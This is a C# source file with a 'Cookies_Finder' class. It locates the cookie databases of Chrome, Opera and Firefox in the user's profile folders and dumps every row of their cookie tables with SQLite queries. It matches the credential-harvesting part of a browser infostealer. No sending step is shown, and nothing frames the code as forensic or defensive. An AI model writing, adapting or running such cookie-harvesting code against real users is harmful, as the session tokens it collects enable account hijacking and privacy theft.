using Dapper;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;

namespace Main_Project
{
    public static class Cookies_Finder
    {
        private const int _count_path = 1;

        private static string _Chrome_cookiesDB_name = "Cookies";
        private static string _Opera_cookiesDB_name = "Cookies";
        private static string _FireFoxe_cookiesDB_name = "cookies.sqlite";

        private static string _Chrome_cookiesTB_name = "cookies";
        private static string _Opera_cookiesTB_name = "cookies";
        private static string _FireFoxe_cookiesTB_name = "moz_cookies";

        private static string _path_to_Chrome = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default";
        private static string _path_to_Opera = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable";
        private static string _path_to_FireFoxe = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";

        private static string Chrome_Cookies_Find()
        {
            try
            {
                var _path_array = Directory.GetFiles(_path_to_Chrome, _Chrome_cookiesDB_name, SearchOption.AllDirectories).ToList();
                if (_path_array.Count != _count_path)
                    throw new Exception("Chrome : cookies not fond =(");
                return _path_array[0];
            }
            catch (Exception) { throw new Exception("Chrome : cookies not fond =("); }
        }
        private static string FireFoxe_Cookies_Find()
        {
            try
            {
                var _path_array = Directory.GetFiles(_path_to_FireFoxe, _FireFoxe_cookiesDB_name, SearchOption.AllDirectories).ToList();
                if (_path_array.Count != _count_path)
                    throw new Exception("FireFoxe : cookies not fond =(");
                return _path_array[0];
            }
            catch (Exception) { throw new Exception("FireFoxe : cookies not fond =("); }
        }
        private static string Opera_Cookies_Find()
        {
            try
            {
                var _path_array = Directory.GetFiles(_path_to_Opera, _Opera_cookiesDB_name, SearchOption.AllDirectories).ToList();
                if (_path_array.Count != _count_path)
                    throw new Exception("Opera : cookies not found =(");
                return _path_array[0];
            }
            catch (Exception) { throw new Exception("Opera : cookies not found =("); }

        }

        public static List<dynamic> Table_Chrome_cookies()
        {
            try
            {
                string connStr = $"Data Source = {Chrome_Cookies_Find()}; ProviderName = System.Data.SQLite";
                using(SQLiteConnection connection = new SQLiteConnection(connStr))
                {
                   return connection.Query($"SELECT * FROM {_Chrome_cookiesTB_name}").ToList();
                }
            }
            catch (Exception) { throw new Exception("Chrome : cookies not found =("); }
        }
        public static List<dynamic> Table_FireFoxe_cookies()
        {
            try
            {
                string connStr = $"Data Source = {FireFoxe_Cookies_Find()}; ProviderName = System.Data.SQLite";
                using (SQLiteConnection connection = new SQLiteConnection(connStr))
                {
                    return connection.Query($"SELECT * FROM {_FireFoxe_cookiesTB_name}").ToList();
                }
            }
            catch (Exception) { throw new Exception("FireFoxe : cookies not fond =("); }
        }
        public static List<dynamic> Table_Opera_cookies()
        {
            try
            {
                string connStr = $"Data Source = {Opera_Cookies_Find()}; ProviderName = System.Data.SQLite";
                using (SQLiteConnection connection = new SQLiteConnection(connStr))
                {
                    return connection.Query($"SELECT * FROM {_Opera_cookiesTB_name}").ToList();
                }
            }
            catch (Exception) { throw new Exception("Opera : cookies not found =("); }
        }
    }
}
